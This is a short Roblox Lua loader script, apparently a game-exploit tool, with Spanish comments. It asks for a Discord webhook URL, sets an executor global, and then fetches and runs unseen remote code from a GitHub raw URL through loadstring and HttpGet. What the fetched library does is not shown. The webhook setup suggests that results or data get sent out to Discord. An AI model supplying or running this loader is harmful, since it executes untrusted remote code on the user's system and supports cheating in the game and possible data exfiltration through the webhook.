local Webhook = "" -- tu webhook

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
    loadstring(game:HttpGet('https://raw.githubusercontent.com/meximafia/Libreria/refs/heads/main/library.lua', true))()
else
    warn("Error: Webhook inválido o no configurado")
    return
end
